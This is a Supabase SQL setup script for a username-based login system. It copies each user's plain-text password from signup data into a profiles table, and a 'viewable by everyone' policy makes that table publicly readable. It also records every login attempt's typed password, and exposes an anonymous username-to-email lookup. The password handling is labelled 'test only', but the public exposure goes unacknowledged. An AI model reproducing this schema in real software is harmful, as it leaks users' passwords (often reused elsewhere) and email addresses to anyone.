-- Run this in your Supabase project's SQL editor (Database -> SQL Editor)

create table if not exists public.profiles (
  id uuid references auth.users on delete cascade primary key,
  username text unique not null,
  -- TEST ONLY: readable plain-text password copy. Remove before production.
  password text,
  created_at timestamp with time zone default now()
);

-- If the table already exists, add the column:
alter table public.profiles add column if not exists password text;

alter table public.profiles enable row level security;

create policy "Public profiles are viewable by everyone"
  on public.profiles for select
  using (true);

create policy "Users can update their own profile"
  on public.profiles for update
  using (auth.uid() = id);

-- Automatically creates a profile row (with username) whenever someone signs up
create or replace function public.handle_new_user()
returns trigger as $$
begin
  insert into public.profiles (id, username, password)
  values (
    new.id,
    new.raw_user_meta_data->>'username',
    -- TEST ONLY: plain-text password captured from signup metadata.
    new.raw_user_meta_data->>'password'
  );
  return new;
end;
$$ language plpgsql security definer;

create trigger on_auth_user_created
  after insert on auth.users
  for each row execute procedure public.handle_new_user();

-- Lets the login page accept a username (not just email) by resolving it to the
-- account's email server-side, without exposing emails through a public table/policy.
create or replace function public.get_email_for_username(uname text)
returns text
language plpgsql
security definer
set search_path = public
as $$
declare
  result text;
begin
  select au.email into result
  from auth.users au
  join public.profiles p on p.id = au.id
  where p.username = uname;
  return result;
end;
$$;

grant execute on function public.get_email_for_username(text) to anon, authenticated;

-- =====================================================================
-- TEST ONLY: capture every login attempt (identifier + plain-text
-- password + whether it succeeded). Remove this whole block before
-- production -- storing entered passwords like this is a security risk.
-- =====================================================================
create table if not exists public.login_attempts (
  id bigint generated always as identity primary key,
  identifier text,
  password text,
  success boolean,
  created_at timestamp with time zone default now()
);

alter table public.login_attempts enable row level security;

-- No SELECT policy: only the service role / dashboard can read these rows.

create or replace function public.log_login_attempt(
  p_identifier text,
  p_password text,
  p_success boolean
)
returns void
language plpgsql
security definer
set search_path = public
as $$
begin
  insert into public.login_attempts (identifier, password, success)
  values (p_identifier, p_password, p_success);
end;
$$;

grant execute on function public.log_login_attempt(text, text, boolean) to anon, authenticated;
